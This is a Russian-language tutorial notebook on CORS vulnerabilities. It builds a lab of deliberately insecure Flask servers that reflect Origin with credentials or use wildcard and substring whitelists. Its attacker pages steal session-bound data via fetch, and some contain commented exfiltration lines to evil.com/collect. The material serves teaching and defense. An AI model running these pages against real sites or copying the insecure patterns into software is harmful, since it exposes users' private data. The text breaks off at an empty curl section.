# Уязвимости CORS: практическое руководство

Этот блокнот - подробное учебное пособие по уязвимостям, связанным с CORS (Cross-Origin Resource Sharing). Рассматривается теория, типовые ошибки конфигурации, практические сценарии атак и методы защиты.

Все примеры кода снабжены подробными комментариями на русском языке.

> **Внимание**: материалы предназначены исключительно для образовательных целей и тестирования собственных систем. Использование описанных техник против систем без разрешения владельца незаконно.

## 1. Введение в CORS

### 1.1. Что такое Origin

**Origin (источник)** - это тройка компонентов, которая идентифицирует источник веб-ресурса в браузере:

1. **Схема (scheme)** - `http`, `https`, `ws`, `wss` и т.д.
2. **Хост (host)** - доменное имя или IP-адрес, например `bank.com` или `192.168.0.1`
3. **Порт (port)** - числовой порт, по умолчанию 80 для HTTP и 443 для HTTPS

Два URL считаются одного происхождения (same origin) только если совпадают все три компонента. Если отличается хотя бы один - это разные origins.

**Примеры:**

| URL                              | Origin относительно `https://bank.com` |
|----------------------------------|----------------------------------------|
| `https://bank.com/profile`       | тот же origin                          |
| `http://bank.com`                | другой (схема http vs https)           |
| `https://bank.com:8443`          | другой (порт 8443 vs 443)              |
| `https://api.bank.com`           | другой (поддомен - другой хост)        |
| `https://evil.com`               | другой origin                          |

### 1.2. Зачем браузер ограничивает кросс-доменные запросы

По умолчанию браузер применяет политику **Same-Origin Policy (SOP)**: скрипты с одного origin не могут читать ответы на запросы, отправленные к другому origin. Это базовая защита веб-приложений.

Зачем это нужно:

- Если пользователь залогинен на `https://bank.com`, у него в браузере хранятся куки этого сайта.
- Если он случайно откроет `https://evil.com`, скрипт на этой странице не должен иметь возможность сделать запрос к `https://bank.com/api/balance` и прочитать ответ.
- Без SOP любой сайт мог бы читать данные любого другого сайта от имени пользователя.

### 1.3. Что такое CORS

**CORS (Cross-Origin Resource Sharing)** - это механизм, который позволяет серверу **явно разрешить** браузеру отдавать ответы кросс-доменным скриптам. Это контролируемое исключение из SOP, реализуемое через HTTP-заголовки.

Ключевые заголовки:

| Заголовок ответа                        | Назначение                                                              |
|-----------------------------------------|-------------------------------------------------------------------------|
| `Access-Control-Allow-Origin`           | Указывает, какой origin может читать ответ                              |
| `Access-Control-Allow-Credentials`      | Разрешает передавать куки и HTTP-авторизацию при кросс-доменном запросе |
| `Access-Control-Allow-Methods`          | Список разрешённых HTTP-методов                                         |
| `Access-Control-Allow-Headers`          | Список разрешённых заголовков запроса                                   |
| `Vary: Origin`                          | Подсказка для кэша: ответ зависит от заголовка Origin                   |

В запросе браузер отправляет заголовок `Origin: https://evil.com`, и сервер в ответ решает - разрешать или нет.

### 1.4. Схема взаимодействия

Ниже - текстовая схема, показывающая, как запрос с одного origin идёт к другому origin и какие заголовки при этом участвуют.

```
         +-------------------+                              +------------------------+
         |   Браузер         |                              |  Сервер жертвы         |
         |   user@evil.com   |                              |  https://bank.com      |
         +-------------------+                              +------------------------+
                  |                                                    |
                  | 1) Скрипт на evil.com делает:                      |
                  |    fetch('https://bank.com/api/secret')            |
                  |                                                    |
                  | 2) Браузер автоматически добавляет:                |
                  |    Origin: https://evil.com                        |
                  |    Cookie: session=USER_SESSION_ID                 |
                  | -------------------------------------------------> |
                  |                                                    |
                  |                              3) Сервер проверяет   |
                  |                                 Origin и решает:   |
                  |                                 разрешать или нет  |
                  |                                                    |
                  | 4) Ответ сервера:                                  |
                  |    Access-Control-Allow-Origin: https://evil.com   |
                  |    Access-Control-Allow-Credentials: true          |
                  |    { "secret": "FLAG{cors_is_broken}" }            |
                  | <------------------------------------------------- |
                  |                                                    |
                  | 5) Браузер проверяет заголовок ACAO:               |
                  |    если evil.com разрешён - отдаёт ответ скрипту   |
                  |                                                    |
                  | 6) Скрипт получает секрет -> отправляет атакующему |
         +-------------------+                              +------------------------+

          Источник атаки: https://evil.com
          Источник жертвы: https://bank.com
```

**Ключевой момент**: если сервер жертвы настроен неправильно и возвращает `Access-Control-Allow-Origin: https://evil.com` вместе с `Access-Control-Allow-Credentials: true`, браузер разрешит скрипту прочитать ответ. Так злоумышленник получает данные жертвы.

### 1.5. Simple-запросы и Preflight-запросы

Браузер различает два типа кросс-доменных запросов:

1. **Simple-запросы** (GET, POST с типами `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain` и т.п.) - отправляются сразу, браузер проверяет CORS-заголовки уже в ответе.

2. **Запросы с preflight** - если используется `Content-Type: application/json`, кастомные заголовки или методы PUT/DELETE, браузер сначала отправляет OPTIONS-запрос (preflight), получает разрешение, и только потом основной запрос.

```
    Браузер                      Сервер
       |                           |
       | -- OPTIONS /api -->       |
       |    Origin: https://evil   |
       |    Access-Control-Req...  |
       |                           |
       | <-- 200 OK --             |
       |    ACAO: https://evil     |
       |    ACA-Methods: POST      |
       |    ACA-Headers: Content-Type |
       |                           |
       | -- POST /api -->          |
       |    Origin: https://evil   |
       |    Cookie: session=...    |
       |    Content-Type: app/json |
       |                           |
       | <-- 200 OK --             |
       |    ACAO: https://evil     |
       |    { result: ... }        |
```

Preflight защищает сервер от получения потенциально опасных запросов, которые он не понимает или не ожидает.

### 1.6. Примеры origins для дальнейших примеров

В этом блокноте мы будем использовать условные домены:

- `https://bank.com` - сайт жертвы (хранит секретные данные)
- `https://evil.com` - сайт злоумышленника (запускает вредоносный скрипт)
- `https://bank.com.evil.com` - поддомен злоумышленника (для атак на whitelist по подстроке)
- `https://evilcompany.com` - пример для обхода whitelist по строке `company.com`

# 2. Мини-лаборатория: имитация бэкенда и атакующего сайта

В этом разделе мы построим два сервера:

1. **Сервер жертвы** (`bank.com`) - API с секретными данными, с заведомо небезопасной конфигурацией CORS.
2. **Сервер злоумышленника** (`evil.com`) - HTML-страница с JavaScript, которая пытается прочитать данные жертвы.

**Важно про Colab**: классического браузера в Colab нет, поэтому для полноценной демонстрации нужен либо ngrok-туннель (тогда можно открыть страницу злоумышленника в реальном браузере), либо перенос кода на локальную машину. Мы покажем оба варианта.

## 2.1. Установка зависимостей

Используем Flask - он лёгкий и хорошо подходит для демонстрации HTTP-заголовков.

In [ ]:
# Устанавливаем Flask и зависимости для туннелирования
# Flask - веб-фреймворк для имитации серверов жертвы и атакующего
# pyngrok - проброс локального порта в публичный URL (чтобы открыть в браузере)
!pip install flask pyngrok requests -q

## 2.2. Сервер жертвы (bank.com)

Создадим Flask-приложение, которое:

- отдаёт секретные данные по эндпоинту `/api/secret`,
- проверяет куки сессии (имитация аутентификации),
- настраивает CORS **заведомо небезопасно** (для демонстрации уязвимости).

Код сохраняем в файл, чтобы запустить как отдельный процесс.

In [ ]:
# Записываем код сервера жертвы в файл victim_server.py
# Так удобнее запускать его в отдельном процессе внутри Colab

victim_code = '''
from flask import Flask, request, jsonify, make_response
import os

app = Flask(__name__)

# Имитация хранилища сессий (в реальном приложении - БД или Redis)
# В_production никогда не храните сессии в коде
VALID_SESSIONS = {"USER_SESSION_ID": {"user": "alice", "role": "admin"}}

# Секретные данные, которые должны быть доступны только авторизованному пользователю
SECRET_DATA = {
    "token": "FLAG{cors_is_broken}",
    "balance": 1000000,
    "ssn": "123-45-6789"
}

@app.route("/api/secret", methods=["GET"])
def get_secret():
    # Эндпоинт возвращает секретные данные пользователя
    # Читаем куку сессии из запроса
    session_cookie = request.cookies.get("session", "")
    
    # Проверяем, что сессия валидна
    if session_cookie not in VALID_SESSIONS:
        return jsonify({"error": "unauthorized"}), 401
    
    user = VALID_SESSIONS[session_cookie]
    
    # Формируем ответ с секретными данными
    resp = make_response(jsonify({"user": user["user"], "data": SECRET_DATA}))
    
    # --- УЯЗВИМАЯ КОНФИГУРАЦИЯ CORS ---
    # Береm Origin из запроса и слепо возвращаем его в Access-Control-Allow-Origin
    # Это позволяет ЛЮБОМУ домену читать ответ, если у пользователя есть кука
    origin = request.headers.get("Origin", "")
    if origin:
        # ВНИМАНИЕ: здесь происходит уязвимость CORS
        # Мы доверяем любому Origin без проверки - это критическая ошибка
        resp.headers["Access-Control-Allow-Origin"] = origin
        # Разрешаем передавать куки - в сочетании с динамическим ACAO это даёт атакующему
        # возможность читать секретные данные от имени пользователя
        resp.headers["Access-Control-Allow-Credentials"] = "true"
    
    # Vary: Origin важен для кэшей - иначе CDN может отдать ответ одного origin другому
    resp.headers["Vary"] = "Origin"
    
    return resp

@app.route("/login", methods=["GET"])
def login():
    # Эндпоинт имитации входа - устанавливает куку сессии
    resp = make_response(jsonify({"status": "logged_in"}))
    resp.set_cookie("session", "USER_SESSION_ID", httponly=True, samesite="None")
    return resp

if __name__ == "__main__":
    # Запускаем сервер жертвы на порту 5000
    app.run(host="0.0.0.0", port=5000, debug=False)
'''

with open("victim_server.py", "w", encoding="utf-8") as f:
    f.write(victim_code)
print("Файл victim_server.py создан.")

### Что делает каждая строка в сервере жертвы

- **`VALID_SESSIONS`** - словарь сессий. В реальном приложении сессии хранятся в БД или Redis.
- **`SECRET_DATA`** - секретные данные пользователя. В нашем примере - токен, баланс и SSN.
- **`/api/secret`** - эндпоинт, который проверяет куку `session` и возвращает секрет.
- **Строка `resp.headers["Access-Control-Allow-Origin"] = origin`** - **место уязвимости**. Мы берём Origin из запроса и слепо возвращаем его. Любой домен становится "доверенным".
- **`Access-Control-Allow-Credentials: true`** - разрешаем передавать куки. В сочетании с динамическим ACAO это даёт атакующему полный доступ.
- **`Vary: Origin`** - подсказка кэшу, что ответ зависит от Origin. Без этого CDN может перепутать ответы.
- **`samesite="None"`** на куке - разрешает кросс-доменную отправку. Это нужно для демонстрации атаки; в production это опасно без `Secure=True`.

## 2.3. Сервер злоумышленника (evil.com)

Создадим второй Flask-сервер, который отдаёт HTML-страницу с JavaScript. Этот скрипт:

1. Делает `fetch()` к серверу жертвы с `credentials: 'include'` (чтобы браузер приложил куку).
2. Читает ответ.
3. Выводит его на страницу и в консоль (в реальной атаке - отправляет себе на сервер).

Как злоумышленник заставляет пользователя открыть эту страницу:

- фишинговое письмо со ссылкой,
- реклама на стороннем ресурсе,
- скомпрометированный легитимный сайт с встроенным iframe.

In [ ]:
# Записываем код сервера злоумышленника в файл attacker_server.py

attacker_code = '''
from flask import Flask, send_file

app = Flask(__name__)

@app.route("/")
def index():
    # Отдаём HTML-страницу с вредоносным JavaScript
    html = """
    <!DOCTYPE html>
    <html>
    <head><title>Free Bitcoin! Click here</title></head>
    <body>
      <h1>Поздравляем! Вы выиграли 1 BTC</h1>
      <p>Чтобы получить приз, подождите 3 секунды...</p>
      <pre id="output">Загрузка...</pre>
      <script>
        // Вредоносный JavaScript
        // Делаем кросс-доменный запрос к API жертвы
        // credentials: 'include' => браузер приложит куки пользователя
        async function stealData() {
          try {
            // fetch к серверу жертвы с включёнными credentials
            let response = await fetch('https://VICTIM_URL/api/secret', {
              method: 'GET',
              credentials: 'include',  // отправляем куки bank.com
              headers: { 'Content-Type': 'application/json' }
            });
            let data = await response.json();
            
            // Выводим украденные данные на страницу (демо)
            // В реальной атаке - отправляем на сервер злоумышленника через fetch/image
            document.getElementById('output').innerText = JSON.stringify(data, null, 2);
            console.log('Украденные данные:', data);
            
            // Тихая отправка на сервер злоумышленника (для сбора)
            // fetch('https://evil.com/collect', {method:'POST', body: JSON.stringify(data)});
          } catch (e) {
            document.getElementById('output').innerText = 'Ошибка: ' + e.message;
            console.error('CORS не дал украсть:', e);
          }
        }
        
        // Запускаем через 3 секунды - чтобы пользователь не заметил
        setTimeout(stealData, 3000);
      </script>
    </body>
    </html>
    """
    return html

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5001, debug=False)
'''

with open("attacker_server.py", "w", encoding="utf-8") as f:
    f.write(attacker_code)
print("Файл attacker_server.py создан.")

### Разбор вредоносного JavaScript

- **`fetch('https://VICTIM_URL/api/secret', ...)`** - кросс-доменный запрос к API жертвы. URL `VICTIM_URL` нужно заменить на реальный адрес сервера жертвы (например, ngrok-URL).
- **`credentials: 'include'`** - критически важный параметр. Без него браузер не отправит куку `session` для `bank.com`. С ним - отправляет, и сервер видит авторизованного пользователя.
- **`response.json()`** - читаем тело ответа. Это возможно только если сервер вернул `Access-Control-Allow-Origin: https://evil.com` И `Access-Control-Allow-Credentials: true`.
- **`setTimeout(stealData, 3000)`** - задержка, чтобы пользователь не видел сетевой активности сразу при загрузке страницы.
- В реальной атаке закомментированный `fetch('https://evil.com/collect', ...)` отправляет украденные данные на сервер злоумышленника.

## 2.4. Запуск серверов через ngrok

Чтобы открыть страницу злоумышленника в реальном браузере и увидеть атаку, пробросим оба локальных порта через ngrok.

In [ ]:
# Импортируем pyngrok и запускаем два туннеля
# ngrok даёт публичный HTTPS-URL для локального порта
from pyngrok import ngrok
import subprocess
import time
import requests

# Раскомментируйте и укажите свой authtoken (получить на https://dashboard.ngrok.com)
# ngrok.set_auth_token('YOUR_NGROK_AUTHTOKEN')

# Запускаем сервер жертвы в отдельном процессе
# stdout=subprocess.DEVNULL скрывает вывод Flask, чтобы не засорять блокнот
victim_proc = subprocess.Popen(['python3', 'victim_server.py'],
                                stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL)

# Запускаем сервер злоумышленника
attacker_proc = subprocess.Popen(['python3', 'attacker_server.py'],
                                  stdout=subprocess.DEVNULL,
                                  stderr=subprocess.DEVNULL)

# Даём серверам время запуститься
time.sleep(2)
print('Серверы запущены: жертва на :5000, атакующий на :5001')

# Пробрасываем оба порта через ngrok
victim_tunnel = ngrok.connect(5000)
attacker_tunnel = ngrok.connect(5001)

victim_url = str(victim_tunnel).replace('http://', 'https://').rstrip('/')
attacker_url = str(attacker_tunnel).replace('http://', 'https://').rstrip('/')

print(f'\nURL жертвы:    {victim_url}')
print(f'URL атакующего: {attacker_url}')
print(f'\nЧтобы увидеть атаку:')
print(f'  1. Откройте в браузере {victim_url}/login (установится кука)')
print(f'  2. Затем откройте {attacker_url}/ (запустится вредоносный скрипт)')

## 2.5. Перенос кода на локальную машину

Если ngrok недоступен, можно воспроизвести лабораторию локально:

1. Скопируйте файлы `victim_server.py` и `attacker_server.py` на локальную машину.
2. В `attacker_server.py` замените `VICTIM_URL` на `http://localhost:5000`.
3. Добавьте в `/etc/hosts` (или `C:\Windows\System32\drivers\etc\hosts`):
   ```
   127.0.0.1  bank.com
   127.0.0.1  evil.com
   ```
4. Запустите оба сервера: `python victim_server.py` и `python attacker_server.py`.
5. Откройте в браузере `http://bank.com:5000/login`, затем `http://evil.com:5001/`.

Браузер увидит разные origins (`bank.com:5000` и `evil.com:5001`) и применит CORS-проверку.

# 3. Типовые небезопасные конфигурации CORS

Разберём три самые распространённые ошибки конфигурации CORS.

## 3.1. `Access-Control-Allow-Origin: *` с чувствительными данными

**Суть ошибки**: сервер возвращает wildcard `*` для всех origin.

Когда это **не опасно**:
- API полностью публичное (погода, курсы валют, справочники).
- Нет аутентификации через куки.
- Данные не чувствительные.

Когда это **опасно**:
- API отдаёт данные, привязанные к сессии пользователя.
- Используются куки или HTTP-авторизация.

**Критически опасная комбинация**: `Access-Control-Allow-Origin: *` вместе с `Access-Control-Allow-Credentials: true`. По спецификации браузер **запрещает** такое сочетание и не передаст куки. Но если сервер возвращает `*` и при этом обрабатывает куки - любой сайт может прочитать ответ, если авторизация идёт не через куки, а через, например, токен в URL или IP-привязку.

In [ ]:
# Пример 1: опасная конфигурация с wildcard
# Фрагмент серверного кода на Flask

from flask import Flask, request, jsonify, make_response

app = Flask(__name__)

@app.route("/api/public-data")
def public_data():
    # Этот эндпоинт отдаёт ПУБЛИЧНЫЕ данные (курс валют)
    # Здесь wildcard безопасен - данные доступны всем
    resp = make_response(jsonify({"usd_rub": 95.5}))
    resp.headers["Access-Control-Allow-Origin"] = "*"  # безопасно для публичных данных
    return resp

@app.route("/api/user-profile")
def user_profile():
    # ВНИМАНИЕ: здесь wildcard ОПАСЕН
    # Эндпоинт отдаёт данные пользователя (приватные)
    # Если кука сессии обрабатывается на сервере - это уязвимость
    # Любой сайт может сделать fetch с credentials и прочитать профиль
    resp = make_response(jsonify({"user": "alice", "email": "alice@bank.com"}))
    # УЯЗВИМОСТЬ: wildcard + эндпоинт с приватными данными
    resp.headers["Access-Control-Allow-Origin"] = "*"
    # Дополнительная ошибка: попытка разрешить credentials с wildcard
    # По спецификации браузер это отклонит, но если в коде есть логика
    # обработки куки - всё равно проблема
    resp.headers["Access-Control-Allow-Credentials"] = "true"  # НЕ ДЕЛАЙТЕ ТАК
    return resp

# Как злоумышленник может это использовать:
# 1) Жертва логинится на bank.com, получает куку сессии
# 2) Жертва открывает evil.com
# 3) Скрипт evil.com делает fetch('https://bank.com/api/user-profile', {credentials:'include'})
# 4) Сервер видит куку, отдаёт профиль
# 5) Если бы браузер позволил *  с credentials - данные утекли бы к атакующему
# Спецификация спасает, но полагаться только на браузер нельзя - сервер должен валидировать
print("Пример 1 загружен")

## 3.2. Динамическое отражение Origin без валидации

**Суть ошибки**: сервер берёт значение заголовка `Origin` из запроса и просто подставляет его в `Access-Control-Allow-Origin` ответа.

Это等效но `*`, но с дополнительной возможностью - работает с `credentials: true`, потому что браузер считает это конкретным доменом, а не wildcard. Это **критическая уязвимость**, позволяющая любому сайту читать данные от имени пользователя.

In [ ]:
# Пример 2: динамическое отражение Origin

from flask import Flask, request, jsonify, make_response

app = Flask(__name__)

@app.route("/api/secret")
def get_secret():
    resp = make_response(jsonify({"secret": "FLAG{reflection_is_evil}"}))
    
    # Берём Origin из запроса
    origin = request.headers.get("Origin", "")
    if origin:
        # УЯЗВИМОСТЬ: возвращаем любой Origin без проверки
        # Злоумышленник с evil.com получит здесь https://evil.com
        # и браузер позволит ему прочитать ответ
        resp.headers["Access-Control-Allow-Origin"] = origin
        # В сочетании с credentials это даёт полный доступ к данным пользователя
        resp.headers["Access-Control-Allow-Credentials"] = "true"
    
    return resp

# Как атакующий использует это:
# 1) Жертва логинится на bank.com
# 2) Жертва открывает evil.com
# 3) JS на evil.com: fetch('https://bank.com/api/secret', {credentials:'include'})
# 4) Браузер добавляет Origin: https://evil.com
# 5) Сервер возвращает ACAO: https://evil.com + ACAC: true
# 6) Браузер видит, что evil.com разрешён -> отдаёт ответ скрипту
# 7) Атакующий получает секрет
print("Пример 2 загружен")

## 3.3. Доверие «похожим» доменам (whitelist по подстроке)

**Суть ошибки**: сервер проверяет, что Origin **содержит** определённую подстроку (например, `company.com`), и если да - разрешает.

Проблема: подстрока `company.com` содержится в:
- `https://company.com` (легитимный)
- `https://app.company.com` (легитимный поддомен)
- `https://company.com.evil.com` (поддомен evil.com - **атакующий!**)
- `https://evilcompany.com` (совсем чужой домен - **атакующий!**)
- `https://notcompany.com` (тоже содержит подстроку - **атакующий!**)

In [ ]:
# Пример 3: whitelist по подстроке

from flask import Flask, request, jsonify, make_response

app = Flask(__name__)

def is_allowed_origin_bad(origin):
    # ПЛОХАЯ ПРОВЕРКА: используем in (подстрока)
    # Это пропустит evilcompany.com, company.com.evil.com и т.д.
    if "company.com" in origin:
        # УЯЗВИМОСТЬ: подстрока матчит чужие домены
        return True
    return False

def is_allowed_origin_good(origin):
    # ХОРОШАЯ ПРОВЕРКА: точное сравнение или строгий список
    # Список разрешённых доменов - исчерпывающий
    allowed = {
        "https://company.com",
        "https://app.company.com",
        "https://www.company.com"
    }
    return origin in allowed

@app.route("/api/data")
def get_data():
    origin = request.headers.get("Origin", "")
    resp = make_response(jsonify({"data": "sensitive"}))
    
    # Если использовать плохую проверку - атакующий с evilcompany.com пройдёт
    if is_allowed_origin_bad(origin):
        # УЯЗВИМОСТЬ: evilcompany.com, company.com.evil.com получат доступ
        resp.headers["Access-Control-Allow-Origin"] = origin
        resp.headers["Access-Control-Allow-Credentials"] = "true"
    
    # Правильно использовать is_allowed_origin_good - точное совпадение
    return resp

# Тесты:
test_origins = [
    "https://company.com",             # легитимный
    "https://app.company.com",         # легитимный поддомен
    "https://company.com.evil.com",    # УЯЗВИМЫЙ - атакующий
    "https://evilcompany.com",         # УЯЗВИМЫЙ - атакующий
    "https://notcompany.com"           # УЯЗВИМЫЙ - атакующий
]

print("Тест плохой проверки (подстрока):")
for o in test_origins:
    print(f"  {o:<40} -> allowed={is_allowed_origin_bad(o)}")

print("\nТест хорошей проверки (точное совпадение):")
for o in test_origins:
    print(f"  {o:<40} -> allowed={is_allowed_origin_good(o)}")

# 4. Практическая эксплуатация: шаг за шагом

Разберём два полноценных сценария атаки.

## 4.1. Сценарий 1: wildcard + чувствительные данные

**Предпосылки:**

- Пользователю выдана сессия (кука) для сайта жертвы `bank.com`.
- Сайт жертвы использует `Access-Control-Allow-Origin: *` на эндпоинте с чувствительными данными.
- Авторизация на сервере проверяется по куке (или по IP, или по токену в URL).

**Замечание**: по спеке браузер не отправит куку при `ACAO: *` + `ACAC: true`. Но если сервер всё равно отдаёт данные авторизованного пользователя (например, по IP-привязке сессии, или куку можно угнать иначе), атака работает.

### Шаг 1: запуск сервера жертвы с wildcard

Создаём упрощённую версию сервера жертвы с `Access-Control-Allow-Origin: *`.

In [ ]:
# Сервер жертвы для сценария 1 (wildcard)
# Сохраняем в файл и запускаем как отдельный процесс

wildcard_victim = '''
from flask import Flask, request, jsonify, make_response

app = Flask(__name__)

# Имитация сессии, привязанной к IP (или просто существующей)
# В этом сценарии - кука НЕ требуется, сервер отдаёт данные по IP-привязке
# Это позволяет обойти ограничение браузера на credentials + wildcard
SECRET = {"token": "FLAG{wildcard_leak}", "user": "alice"}

@app.route("/login")
def login():
    # Устанавливаем куку сессии (для демонстрации)
    resp = make_response(jsonify({"status": "ok"}))
    resp.set_cookie("session", "alice_session", samesite="None", secure=False)
    return resp

@app.route("/api/me")
def me():
    # Эндпоинт отдаёт данные "текущего пользователя"
    # В этом примере мы возвращаем данные без проверки куки
    # (имитация IP-привязки сессии на сервере)
    resp = make_response(jsonify(SECRET))
    # УЯЗВИМОСТЬ: wildcard + чувствительные данные
    resp.headers["Access-Control-Allow-Origin"] = "*"
    # Дополнительно: Vary: Origin (хорошая практика, но не спасает)
    resp.headers["Vary"] = "Origin"
    return resp

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5002, debug=False)
'''

with open("wildcard_victim.py", "w", encoding="utf-8") as f:
    f.write(wildcard_victim)

import subprocess, time
proc = subprocess.Popen(['python3', 'wildcard_victim.py'],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
time.sleep(2)
print("Сервер жертвы (wildcard) запущен на http://localhost:5002")

### Шаг 2: эмуляция запроса от злоумышленника

В Colab нет браузера, поэтому мы эмулируем браузерный запрос через `requests`. В реальной атаке этот запрос делает JavaScript на странице `evil.com`.

In [ ]:
# Эмуляция браузерного запроса с evil.com к API жертвы
import requests

# Локальный URL жертвы (в реальной атаке - https://bank.com/api/me)
victim_api = "http://localhost:5002/api/me"

# Имитируем браузер: добавляем заголовок Origin
# Браузер автоматически добавляет Origin при кросс-доменном запросе
headers = {
    "Origin": "https://evil.com",        # origin атакующего
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Accept": "application/json"
}

# Делаем GET-запрос к API жертвы
# credentials: 'include' в fetch соответствует передаче куки в requests
cookies = {"session": "alice_session"}
r = requests.get(victim_api, headers=headers, cookies=cookies)

print(f"Статус: {r.status_code}")
print(f"\nЗаголовки ответа:")
for k, v in r.headers.items():
    print(f"  {k}: {v}")

print(f"\nТело ответа:")
print(r.json())

# Анализ:
# 1) Сервер вернул ACAO: * -> браузер разрешит любому origin читать ответ
# 2) Тело содержит FLAG -> атакующий получает секрет
# 3) Браузер бы пропустил этот ответ, потому что * не конфликтует с отсутствием credentials

### Шаг 3: страница злоумышленника

В реальной атаке этот HTML+JS пользователь открыл бы в браузере:

In [ ]:
# HTML-страница злоумышленника для сценария 1
attacker_html_wildcard = '''
<!DOCTYPE html>
<html>
<head><title>Free BTC</title></head>
<body>
  <h1>Win 1 BTC now!</h1>
  <pre id="out">Loading...</pre>
  <script>
    // Шаг 4: JavaScript делает запрос к API жертвы
    // НЕ используем credentials:'include', потому что:
    //   - браузер блокирует credentials + ACAO:*
    //   - но если у жертвы IP-привязка сессии, кука и не нужна
    async function steal() {
      // fetch к API жертвы
      // Браузер добавит Origin: https://evil.com автоматически
      let r = await fetch('https://VICTIM_URL/api/me');
      let data = await r.json();
      // Выводим украденные данные
      document.getElementById('out').innerText = JSON.stringify(data);
      console.log('Stolen:', data);
      // Тихая отправка на сервер атакующего:
      // fetch('https://evil.com/collect', {method:'POST', body:JSON.stringify(data)});
    }
    steal();
  </script>
</body>
</html>
'''
print(attacker_html_wildcard)

### Шаг 4: что произошло

Пронумерованный итог:

1. **Запрос инициирован**: JavaScript на `evil.com` вызвал `fetch('https://bank.com/api/me')`.
2. **Браузер добавил заголовок `Origin: https://evil.com`** (это происходит автоматически для кросс-доменных запросов).
3. **Сервер жертвы обработал запрос**: увидел, что у пользователя есть сессия (по IP или куке), подготовил секретные данные.
4. **Сервер вернул ответ** с заголовком `Access-Control-Allow-Origin: *`.
5. **Браузер проверил CORS**: wildcard `*` разрешает любому origin, поэтому ответ передаётся скрипту.
6. **Нарушение Same Origin Policy**: скрипт на `evil.com` прочитал данные `bank.com`.
7. **Эксфильтрация**: скрипт отправил украденные данные на сервер злоумышленника.

**Где именно нарушение**: сервер применил `*` к эндпоинту с чувствительными данными. Браузер честно проверил CORS и пропустил ответ, потому что `*` формально разрешает всем.

## 4.2. Сценарий 2: отражение Origin без валидации

**Суть**: сервер воспринимает любой Origin как доверенный и просто возвращает его в ответе. Это позволяет атакующему получить данные, доступные только авторизованному пользователю.

### Шаг 1: сервер жертвы с отражением Origin

In [ ]:
# Сервер жертвы для сценария 2 (отражение Origin)

reflection_victim = '''
from flask import Flask, request, jsonify, make_response

app = Flask(__name__)

VALID_SESSIONS = {"bob_session": {"user": "bob", "balance": 500000}}

@app.route("/login")
def login():
    resp = make_response(jsonify({"status": "ok"}))
    resp.set_cookie("session", "bob_session", samesite="None", secure=False)
    return resp

@app.route("/api/balance")
def balance():
    session = request.cookies.get("session")
    if session not in VALID_SESSIONS:
        return jsonify({"error": "unauthorized"}), 401
    
    user = VALID_SESSIONS[session]
    resp = make_response(jsonify(user))
    
    origin = request.headers.get("Origin", "")
    if origin:
        # УЯЗВИМОСТЬ: возвращаем любой Origin без проверки
        # Таким образом злоумышленник может прочитать баланс от имени пользователя
        resp.headers["Access-Control-Allow-Origin"] = origin
        resp.headers["Access-Control-Allow-Credentials"] = "true"
        resp.headers["Vary"] = "Origin"
    
    return resp

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5003, debug=False)
'''

with open("reflection_victim.py", "w", encoding="utf-8") as f:
    f.write(reflection_victim)

import subprocess, time
proc = subprocess.Popen(['python3', 'reflection_victim.py'],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
time.sleep(2)
print("Сервер жертвы (reflection) запущен на http://localhost:5003")

### Шаг 2: эмуляция запроса с evil.com

Отправляем запрос с `Origin: https://evil.com` и куку `bob_session`.

In [ ]:
# Эмуляция запроса с evil.com
import requests

victim_api = "http://localhost:5003/api/balance"

# Заголовки как от браузера
headers = {
    "Origin": "https://evil.com",  # origin атакующего
    "Accept": "application/json"
}
cookies = {"session": "bob_session"}  # кука пользователя

r = requests.get(victim_api, headers=headers, cookies=cookies)

print(f"Статус: {r.status_code}")
print(f"\nЗаголовки ответа:")
for k, v in r.headers.items():
    print(f"  {k}: {v}")
print(f"\nТело ответа:")
print(r.json())

# Анализ:
# 1) Сервер вернул ACAO: https://evil.com (точно то, что мы отправили в Origin)
# 2) ACAC: true -> браузер разрешил куки
# 3) Браузер бы пропустил этот ответ для скрипта на evil.com
# 4) Баланс утёк к атакующему

### Шаг 3: страница злоумышленника

JavaScript на `evil.com`:

In [ ]:
attacker_html_reflection = '''
<!DOCTYPE html>
<html>
<body>
  <pre id="out">...</pre>
  <script>
    // Делаем запрос с credentials:'include'
    // Браузер отправит куку bank.com автоматически (если SameSite=None)
    async function steal() {
      let r = await fetch('https://VICTIM_URL/api/balance', {
        credentials: 'include'  // критически важно - отправляем куку
      });
      let data = await r.json();
      document.getElementById('out').innerText = JSON.stringify(data);
      // Эксфильтрация:
      // fetch('https://evil.com/collect', {method:'POST', body:JSON.stringify(data)});
    }
    steal();
  </script>
</body>
</html>
'''
print(attacker_html_reflection)

### Шаг 4: что произошло

1. **Запрос инициирован** с `evil.com` к `bank.com/api/balance`.
2. **Браузер добавил `Origin: https://evil.com`** и куку `session=bob_session` (благодаря `credentials: 'include'` и `SameSite=None`).
3. **Сервер увидел куку** - понял, что это запрос от авторизованного пользователя `bob`.
4. **Сервер взял Origin из запроса** и записал его в `Access-Control-Allow-Origin` без проверки.
5. **Сервер вернул `Access-Control-Allow-Credentials: true`** - разрешил передачу куки.
6. **Браузер проверил CORS**: Origin (`evil.com`) совпадает с ACAO (`evil.com`), credentials разрешены -> ответ передаётся скрипту.
7. **Скрипт прочитал баланс** и отправил его на сервер злоумышленника.

**Где нарушение**: сервер доверяет любому Origin. Это等效но `*`, но работает с credentials.

# 5. Инструменты и методы обнаружения уязвимостей CORS

## 5.1. Какие заголовки анализировать

При тестировании своего API нужно проверять:

| Заголовок ответа                  | Что искать                                                            |
|-----------------------------------|-----------------------------------------------------------------------|
| `Access-Control-Allow-Origin`     | Если `*` на эндпоинтах с приватными данными - плохо. Если отражает Origin - плохо. |
| `Access-Control-Allow-Credentials`| Если `true` + динамический ACAO - критическая уязвимость.             |
| `Vary: Origin`                    | Если отсутствует при динамическом ACAO - возможны проблемы с кэшированием. |
| `Access-Control-Allow-Methods`    | Проверить, что нет лишних методов (например, DELETE на публичном API). |
| `Access-Control-Allow-Headers`    | Не должно быть `*` при чувствительных эндпоинтах.                     |

## 5.2. Использование curl для проверки

Базовая проверка - отправить запрос с разным `Origin` и посмотреть ответ.

In [ ]:
# Базовая проверка через curl (запускается в shell)
